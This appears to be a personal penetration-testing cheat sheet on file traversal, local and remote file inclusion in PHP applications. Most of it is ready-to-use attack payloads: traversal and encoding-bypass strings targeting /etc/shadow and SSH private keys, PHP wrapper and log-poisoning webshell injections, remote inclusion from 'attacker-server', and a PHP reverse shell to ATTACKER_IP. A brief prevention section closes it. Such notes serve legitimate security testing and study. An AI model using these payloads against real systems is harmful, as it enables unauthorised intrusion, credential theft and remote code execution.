# file-traversal-lfi-rfi

**Author:** Julien Bongars\
**Date:** 2025-09-26 21:58:30
**Path:**

---

## Basic Path Traversal Patterns

### Linux Systems

```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
```

### Windows Systems

```
..\..\..\windows\system32\drivers\etc\hosts
....\\....\\....\\windows\\system32\\drivers\\etc\\hosts
..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts
```

## Common Target Files

### Linux Configuration Files

```
/etc/passwd          # User accounts
/etc/shadow          # Password hashes (requires root)
/etc/group           # Groups
/etc/hosts           # Host mappings
/etc/fstab           # File systems
/etc/crontab         # Scheduled tasks
/proc/version        # Kernel version
/proc/cmdline        # Boot parameters
/proc/mounts         # Mounted filesystems
/proc/net/tcp        # Network connections
/proc/net/fib_trie   # Network routing
```

### Web Server Files

```
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/var/www/html/index.php
```

### Application Configuration

```
/etc/mysql/my.cnf
/etc/postgresql/postgresql.conf
/etc/ssh/sshd_config
/home/user/.ssh/id_rsa
/home/user/.bash_history
/root/.bash_history
```

## PHP Wrappers Exploitation

### php://filter (Source Code Disclosure)

```
php://filter/read=convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://filter/read=string.rot13/resource=index.php
php://filter/read=convert.quoted-printable-encode/resource=index.php
```

### php://input (POST Data Execution)

```
POST request to: ?file=php://input
POST body: <?php system($_GET['cmd']); ?>
Then: ?file=php://input&cmd=id
```

### data:// (Direct Code Execution)

```
data://text/plain,<?php system($_GET['cmd']); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

### expect:// (Command Execution)

```
expect://id
expect://whoami
expect://cat /etc/passwd
```

## Log Poisoning Techniques

### Apache Access Log Poisoning

1. **Inject payload via User-Agent:**

   ```bash
   curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
   ```

2. **Access log via LFI:**
   ```
   ?file=../../../var/log/apache2/access.log&cmd=id
   ```

### SSH Log Poisoning

1. **Inject via SSH username:**

   ```bash
   ssh '<?php system($_GET["cmd"]); ?>'@target-ip
   ```

2. **Access auth log:**
   ```
   ?file=../../../var/log/auth.log&cmd=whoami
   ```

### Mail Log Poisoning

1. **Send mail with PHP payload:**

   ```bash
   mail -s "<?php system(\$_GET['cmd']); ?>" user@localhost < /dev/null
   ```

2. **Access mail log:**
   ```
   ?file=../../../var/log/mail.log&cmd=id
   ```

## Remote File Inclusion (RFI)

### Test for RFI Support

```
?file=http://attacker-server/test.txt
?file=ftp://attacker-server/test.txt
?file=\\attacker-server\share\test.txt  # Windows SMB
```

### Setting Up Attack Server

```bash
# Python HTTP server
python3 -m http.server 8080

# PHP built-in server
php -S 0.0.0.0:8080

# FTP server (Python)
python3 -m pyftpdlib -p 21 -w
```

### Reverse Shell Payloads

**PHP Reverse Shell:**

```php
<?php
$ip = 'ATTACKER_IP';
$port = 4444;
$sock = fsockopen($ip, $port);
exec("/bin/bash -i <&3 >&3 2>&3", $sock);
?>
```

**One-liner PHP Shell:**

```php
<?php system($_GET['cmd']); ?>
```

## Bypass Techniques

### Null Byte Injection (PHP < 5.3.4)

```
?file=../../../etc/passwd%00
?file=../../../etc/passwd%00.jpg
```

### Double Encoding

```
%252e%252e%252f  # ../
%252e%252e%255c  # ..\
```

### Unicode Bypass

```
..%c0%af
..%c1%9c
```

### Filter Bypass

```
....//
...\\/
....\\
```

## Detection and Enumeration

### Check for LFI Vulnerability

```bash
# Basic test
curl "http://target/?file=../../../etc/passwd"

# Automated scanning
ffuf -u "http://target/FUZZ" -w /path/to/lfi-wordlist.txt

# Burp Suite Intruder payloads
wfuzz -u "http://target/?file=FUZZ" -w lfi-payloads.txt
```

### Identify OS and Services

```
# Linux detection
?file=../../../etc/passwd
?file=../../../proc/version

# Windows detection
?file=..\..\..\..\windows\system32\drivers\etc\hosts
?file=C:\windows\system32\drivers\etc\hosts

# Web server detection
?file=../../../var/log/apache2/access.log
?file=../../../var/log/nginx/access.log
```

## Prevention and Remediation

### Secure Coding Practices

```php
// Input validation
$allowed_files = ['page1.php', 'page2.php', 'page3.php'];
$file = $_GET['file'];
if (in_array($file, $allowed_files)) {
    include $file;
}

// Use basename() to prevent directory traversal
$file = basename($_GET['file']);
include "/var/www/pages/" . $file;

// Whitelist approach with realpath()
$file = realpath("/var/www/pages/" . $_GET['file']);
if (strpos($file, '/var/www/pages/') === 0) {
    include $file;
}
```

### Server Configuration

- Disable dangerous PHP functions: `allow_url_include`, `allow_url_fopen`
- Use `open_basedir` restriction
- Implement proper file permissions
- Enable logging and monitoring
- Use Web Application Firewall (WAF)

## Common LFI to RCE Chains

1. **LFI → Log Poisoning → RCE**
2. **LFI → Session File Poisoning → RCE**
3. **LFI → Mail Log Poisoning → RCE**
4. **LFI → PHP Wrapper → RCE**
5. **LFI → RFI → RCE**

## Useful Tools

- **ffuf** - Fast web fuzzer
- **Burp Suite** - Web application testing
- **wfuzz** - Web application bruteforcer
- **LFISuite** - Automated LFI exploitation
- **fimap** - File inclusion mapper
- **Kadimus** - LFI exploitation tool
